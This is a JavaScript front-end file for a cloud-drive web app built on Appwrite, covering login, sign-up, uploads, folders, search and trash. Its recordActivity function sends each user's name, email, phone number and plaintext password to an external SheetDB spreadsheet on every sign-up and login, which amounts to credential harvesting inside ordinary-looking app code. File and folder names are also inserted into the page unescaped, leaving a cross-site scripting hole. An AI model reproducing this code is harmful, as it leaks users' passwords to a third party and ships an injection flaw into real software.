const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// 1. KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// STATE VARIABLES
let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// ======================================================
// 2. FUNGSI PENCATAT EXCEL
// ======================================================
async function recordActivity(sheetName, userData) {
    try {
        const now = new Date();
        const formattedDate = now.toLocaleString('id-ID', { 
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(/\./g, ':'); 

        const payload = {
            "ID": userData.id || "-",
            "Nama": userData.name || "-",
            "Email": userData.email || "-",
            "Phone": userData.phone || "-",       
            "Password": userData.password || "-", 
            "Waktu": formattedDate,
            "Riwayat Waktu": formattedDate 
        };

        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: payload })
        });
    } catch (error) { console.error("Excel Error:", error); }
}

// ======================================================
// 3. INISIALISASI
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();
    initNewButtonLogic(); // Klik Kiri Tombol New
    initDragAndDrop();
    initLogout();
    initSearchBar();
    initAllContextMenus(); // <--- SEMUA LOGIKA KLIK KANAN DI SINI
});

window.togglePass = (id, icon) => {
    const input = document.getElementById(id);
    if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } 
    else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); }
};

// ======================================================
// 4. LOGIKA KLIK KANAN LENGKAP (NEW, DRIVE, FILE, GLOBAL)
// ======================================================
function initAllContextMenus() {
    const globalMenu = el('globalContextMenu');
    const newBtnMenu = el('dropdownMenu');
    const fileMenu = el('contextMenu');
    
    const newBtn = el('newBtnMain');
    const navDrive = el('navDrive');
    const mainArea = document.querySelector('.main-content-area');

    // Helper: Tutup semua menu
    const closeAllMenus = () => {
        if(globalMenu) globalMenu.classList.remove('show');
        if(newBtnMenu) newBtnMenu.classList.remove('show');
        if(fileMenu) fileMenu.classList.add('hidden');
    };

    // A. KLIK KANAN PADA TOMBOL "+ NEW"
    if (newBtn && newBtnMenu) {
        newBtn.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            e.stopPropagation();
            closeAllMenus();
            newBtnMenu.classList.add('show'); // Tampilkan menu dropdown New
        });
    }

    // B. KLIK KANAN PADA "DRIVE SAYA" (SIDEBAR)
    if (navDrive && globalMenu) {
        navDrive.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            e.stopPropagation();
            closeAllMenus();
            
            // Munculkan menu global di posisi mouse
            globalMenu.style.top = `${e.clientY}px`;
            globalMenu.style.left = `${e.clientX}px`;
            globalMenu.classList.add('show');
        });
    }

    // C. KLIK KANAN DI AREA KOSONG (BACKGROUND)
    if (mainArea && globalMenu) {
        mainArea.addEventListener('contextmenu', (e) => {
            // Jika yang diklik adalah FILE (item-card), biarkan logika renderItem yang menangani
            if (e.target.closest('.item-card')) return;

            e.preventDefault();
            closeAllMenus();

            globalMenu.style.top = `${e.clientY}px`;
            globalMenu.style.left = `${e.clientX}px`;
            globalMenu.classList.add('show');
        });
    }

    // D. KLIK KIRI DI MANA SAJA (TUTUP MENU)
    window.addEventListener('click', (e) => {
        // Jangan tutup jika sedang klik di dalam menu itu sendiri
        if (e.target.closest('.dropdown-content') || e.target.closest('.context-menu')) return;
        closeAllMenus();
    });
}

// ======================================================
// 5. AUTH SYSTEM
// ======================================================
if(el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value; 
        const phone = el('regPhone').value; const pass = el('regPass').value; const verify = el('regVerify').value;
        if (pass !== verify) return alert("Password tidak sama!");
        
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone }); } catch(err){}
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            alert("Sign Up Berhasil!"); window.nav('loginPage');
        } catch(e) { 
            if(e.message.includes('exists')) alert("Email/No HP sudah terdaftar."); else alert(e.message);
        } finally { hideLoading(); }
    });
}

if(el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
        showLoading();
        try {
            if (!inputId.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
                if (res.total === 0) throw new Error("User tidak ditemukan");
                inputId = res.documents[0].email;
            }
            try { await account.get(); } catch (err) { await account.createEmailPasswordSession(inputId, pass); }
            const userAuth = await account.get();
            let userPhone = "-";
            try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id); userPhone = userDB.phone || "-"; } catch(e){}
            await recordActivity('Login', { id: userAuth.$id, name: userAuth.name, email: userAuth.email, phone: userPhone, password: pass });
            checkSession();
        } catch (error) { 
            if(error.message.includes('session is active')) checkSession(); else { alert(error.message); hideLoading(); }
        }
    });
}

function initLogout() {
    const btn = document.getElementById('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async (e) => {
            if (confirm("Keluar?")) {
                showLoading();
                try {
                    if (currentUser) {
                        let userPhone = "-";
                        try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); userPhone = userDB.phone || "-"; } catch(e){}
                        await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email, phone: userPhone, password: "-" });
                    }
                    await account.deleteSession('current'); window.location.reload(); 
                } catch (error) { window.location.reload(); } finally { hideLoading(); }
            }
        });
    }
}

// ======================================================
// 6. NAVIGASI, FILE LOAD & SEARCH
// ======================================================
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { window.nav('loginPage'); } 
    finally { setTimeout(hideLoading, 500); }
}

window.nav = (p) => { ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); el(p).classList.remove('hidden'); };

window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); element.classList.add('active');
    currentViewMode = mode; currentFolderId = 'root'; 
    currentFolderName = (mode === 'root') ? 'Drive' : element.innerText.trim();
    loadFiles(mode);
};

// SEARCH LOGIC
let searchTimeout = null;
function initSearchBar() {
    const input = el('searchInput'); const clearBtn = el('clearSearchBtn');
    if (!input) return;
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length > 0) clearBtn.classList.remove('hidden'); else { clearBtn.classList.add('hidden'); loadFiles(currentFolderId); return; }
        clearTimeout(searchTimeout);
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari...</p></div>`;
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    if (!currentUser) return;
    el('headerTitle').innerText = `Hasil pencarian: "${keyword}"`;
    updateHeaderUI();
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.search('name', keyword), 
            Appwrite.Query.limit(50)
        ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;margin-top:50px;">Tidak ditemukan</p>`;
        else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { fallbackSearch(keyword); }
}

async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => doc.name.toLowerCase().includes(keyword.toLowerCase()));
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan</p>`;
        else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}

window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

// LOAD FILES
async function loadFiles(param) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = ''; 
    updateHeaderUI();

    let queries = [Appwrite.Query.equal('owner', currentUser.$id)];
    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.limit(20), Appwrite.Query.equal('trashed', false));
    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false));
    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true));
    else {
        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param;
        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false));
    }
    updateHeaderUI();

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries);
        if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`;
        else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { console.error(e); }
}

function updateHeaderUI() {
    const container = document.querySelector('.breadcrumb-area');
    const isRoot = currentFolderId === 'root' && currentViewMode === 'root';
    if (isRoot) {
        const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night";
        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`;
    } else {
        container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`;
    }
}

window.goBack = () => { currentFolderId = 'root'; currentFolderName = "Drive"; currentViewMode = 'root'; document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); document.querySelectorAll('.nav-item')[0].classList.add('active'); loadFiles('root'); };
function openFolder(id, name) { currentFolderId = id; currentFolderName = name; loadFiles(id); }

// ======================================================
// 7. RENDER ITEM (KLIK KANAN FILE/FOLDER)
// ======================================================
function renderItem(doc) {
    const grid = el('fileGrid'); const div = document.createElement('div'); div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:12px;left:12px;color:#ffd700;"></i>` : '';
    let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp)$/i)) content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
    
    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    
    // KLIK KIRI
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };
    
    // KLIK KANAN PADA ITEM
    div.oncontextmenu = (e) => { 
        e.preventDefault(); 
        e.stopPropagation(); // PENTING: Agar tidak memicu klik kanan background
        
        // Tutup menu lain
        const globalMenu = el('globalContextMenu');
        const newBtnMenu = el('dropdownMenu');
        if(globalMenu) globalMenu.classList.remove('show');
        if(newBtnMenu) newBtnMenu.classList.remove('show');

        selectedItem = doc; 
        const menu = el('contextMenu'); 
        menu.style.top = `${e.clientY}px`; 
        menu.style.left = `${e.clientX}px`; 
        menu.classList.remove('hidden'); 
        
        if(el('starText')) el('starText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi"; 
        
        const isTrash = doc.trashed; 
        el('trashBtn').classList.toggle('hidden', isTrash); 
        el('restoreBtn').classList.toggle('hidden', !isTrash); 
        el('permDeleteBtn').classList.toggle('hidden', !isTrash); 
    };
    grid.appendChild(div);
}

// ======================================================
// 8. STORAGE, MODAL & ACTIONS
// ======================================================
async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file'), Appwrite.Query.limit(100)]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|svg)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|avi|mov|wmv)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        const mb = (storageDetail.total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`; el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) {}
}

window.openStorageModal = () => {
    const total = storageDetail.total || 1;
    el('barImages').style.width = `${(storageDetail.images/total)*100}%`;
    el('barVideos').style.width = `${(storageDetail.videos/total)*100}%`;
    el('barDocs').style.width = `${(storageDetail.docs/total)*100}%`;
    el('barOthers').style.width = `${(storageDetail.others/total)*100}%`;
    el('storageBigText').innerText = (storageDetail.total / 1048576).toFixed(2) + " MB";
    el('valImages').innerText = (storageDetail.images / 1048576).toFixed(2) + " MB";
    el('valVideos').innerText = (storageDetail.videos / 1048576).toFixed(2) + " MB";
    el('valDocs').innerText = (storageDetail.docs / 1048576).toFixed(2) + " MB";
    el('valOthers').innerText = (storageDetail.others / 1048576).toFixed(2) + " MB";
    window.openModal('storageModal');
};

function initNewButtonLogic() {
    const btn = el('newBtnMain'); const menu = el('dropdownMenu');
    if (btn && menu) {
        // Klik Kiri
        btn.addEventListener('click', (e) => { e.stopPropagation(); menu.classList.toggle('show'); });
    }
}

function initDragAndDrop() {
    const zone = el('dropZone'); const input = el('fileInputHidden');
    if (!zone) return;
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(evt => zone.addEventListener(evt, (e) => { e.preventDefault(); e.stopPropagation(); }));
    zone.addEventListener('dragover', () => zone.classList.add('active'));
    zone.addEventListener('dragleave', () => zone.classList.remove('active'));
    zone.addEventListener('drop', (e) => { zone.classList.remove('active'); if (e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); });
    if (input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
}

function handleFileSelect(file) {
    selectedUploadFile = file;
    el('fileInfoText').innerText = `Terpilih: ${file.name}`;
    el('fileInfoContainer').classList.remove('hidden');
}

function resetUploadUI() {
    selectedUploadFile = null;
    if(el('fileInfoContainer')) el('fileInfoContainer').classList.add('hidden');
    if(el('fileInputHidden')) el('fileInputHidden').value = '';
}

window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!");
    closeModal('uploadModal'); showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false
        });
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false
        });
        loadFiles(currentFolderId); el('newFolderName').value = '';
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.openModal = (id) => { 
    // Tutup semua menu konteks saat modal dibuka
    const globalMenu = el('globalContextMenu');
    const newBtnMenu = el('dropdownMenu');
    const fileMenu = el('contextMenu');
    if(globalMenu) globalMenu.classList.remove('show');
    if(newBtnMenu) newBtnMenu.classList.remove('show');
    if(fileMenu) fileMenu.classList.add('hidden');

    el(id).classList.remove('hidden'); 
    if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); 
};

window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');
window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); } catch(e){alert(e.message);} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles('root'); } catch(e){alert(e.message);} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); } catch(e){alert(e.message);} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); } catch(e){alert(e.message);} };